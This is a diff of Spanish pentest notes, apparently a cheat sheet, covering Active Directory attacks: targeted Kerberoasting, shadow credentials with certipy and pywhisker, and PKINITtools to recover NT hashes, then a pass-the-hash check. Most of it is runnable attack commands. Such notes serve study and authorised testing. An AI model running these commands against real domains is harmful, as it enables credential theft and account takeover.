@@ -20,17 +20,18 @@ Ataques:
 ```bash 
 Paso 1:
 # Sincronizar el reloj con el DC
-❯ sudo timedatectl set-ntp false
-❯ sudo ntpdate IP_DC
+❯ sudo timedatectl set-ntp off 
+❯ sudo ntpdate -u IP_DC
 
 # o
-
+❯ sudo rdate -n IP_DC
 ❯ sudo chronyd -q 'server IP_DC iburst'
 ```
 
 ```powershell 
 Paso 2:
 ❯ python3 targetedKerberoast.py -u 'ControlledAccount' -p 'P@$$w0rd123!' -d 'domain' --dc-ip IP
+
 ❯ python3 targetedKerberoast.py -u 'ControlledAccount' -p 'P@$$w0rd123!' -d 'domain' --dc-ip IP > kerberoasting.tgt 
 # Esto lo hace para todos los usuarios y al usuario que encuentre con el permiso de GenericWrite le escribe temporal sobre el atributo SPN para obtener el TGT. 
 
@@ -55,10 +56,16 @@ Paso 3:
 * [Theory - Shadow Credential Attack](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials#shadow-credentials)
 
 ```bash 
-❯ certipy shadow auto -u 'ControlledAccount' -p 'P@$$w0rd123!' -account 'targetAccount' -dc-ip IP_DC
+Paso 1:
+❯ sudo timedatectl set-ntp off 
+❯ sudo ntpdate -u IP_DC
+
+Paso 2:
+❯ certipy-ad shadow auto -u 'ControlledAccount' -p 'P@$$w0rd123!' -account 'targetAccount' -dc-ip IP_DC
 ```
 
 ```bash 
+Paso 3:
 # Verificar si el HASH es válido 
 ❯ nxc smb IP_DC -u targetAccount -H '259745cb123a52aa2e693aaacca2db52' --shares
 ```
@@ -71,16 +78,16 @@ Paso 3:
 
 ```bash 
 # Instalación 
-❯ git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && python3 -m venv env && source env/bin/activate && pip install --upgrade pip && pip install -r requirements.txt
+❯ git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && python3 -m venv env && source env/bin/activate && pip install --upgrade pip && pip install -r requirements.txt && cd pywhisker && chmod +x pywhisker.py
 ```
 
 ```bash
 # Shadow credentials attack 
 Paso 1:
-❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "list" 
+❯ ./pywhisker.py -d domain.local -u "ControlledAccount" -p "password" --target "targetAccount" --action "list" 
 # Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'
 
-❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "add" 
+❯ ./pywhisker.py -d domain.local -u "ControlledAccount" -p "password" --target "targetAccount" --action "add" 
 
 # La tool crea una llave privada, una pública y lo añade al usuario víctima 
 
@@ -101,11 +108,7 @@ NOTA:
 
 ```bash 
 # Instalación
-❯ git clone https://github.com/dirkjanm/PKINITtools
-❯ cd PKINITtools
-❯ python3 -m venv env
-❯ source env/bin/activate
-❯ pip install -r requirements.txt
+❯ git clone https://github.com/dirkjanm/PKINITtools && cd PKINITtools && python3 -m venv env && source env/bin/activate && pip install -r requirements.txt && chmod +x gettgtpkinit.py && chmod +x getnthash.py
 ```
 
 ```bash 
@@ -114,22 +117,22 @@ NOTA:
 # Obtener el hash NT
 Paso 2:
 # En el output del comando se muestra la 'key'
-❯ ./gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'password' domain/User output.ccache   
+❯ ./gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'password' domain/targetAccount output.ccache   
 	
 	# -cert-pfx = Archivo PFX (obtenido de pywhisker)
 	# -pfx-pass = Contraseña del PFX (obtenida de pywhisker)
-	# domain/User = Usuario target
+	# domain/targetAccount = Usuario y dominio target
 	# output.ccache = Archivo de salida (Kerberos ticket)
 	
 	# Output muestra: TGT session key (COPIAR ESTO)
 	# Ejemplo: [+] TGT session key: 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c
 
 Paso 3:
-❯ KRB5CCNAME=output.ccache ./getnthash.py -key 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c -dc-ip IP_DC domain/User
+❯ KRB5CCNAME=output.ccache ./getnthash.py -key 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c -dc-ip IP_DC domain/targetAccount
 
 	# -key = La SESSION KEY que salió en gettgtpkinit.py (NO es 123456!)
 	# -dc-ip = IP del Domain Controller
-	# domain/User = Usuario target
+	# domain/targetAccount = Usuario y dominio target
 	
 	# Output: NT Hash (aad3b435b51404eeaad3b435b51404ee:88f6fb6111fcf...)
 ```
